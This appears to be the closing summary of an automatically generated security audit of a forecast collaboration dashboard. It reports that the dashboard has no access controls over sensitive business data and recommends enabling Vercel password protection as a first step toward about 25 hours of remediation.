The C2-CPFR dashboard is a well-designed forecast collaboration tool with a polished UI and smart dynamic column mapping. However, it currently runs with **zero security controls** protecting Anker's most sensitive business data — forecast quantities, pricing, and inventory levels.

The single most impactful action is **enabling Vercel Password Protection** (5 minutes) to immediately gate all access. This alone eliminates the highest-risk scenarios while the more comprehensive remediations are implemented.

**Estimated total remediation effort:** ~25 hours across 3 phases

---

*Audit generated by Knox Deep Audit System — Token Burner Cycle 3*
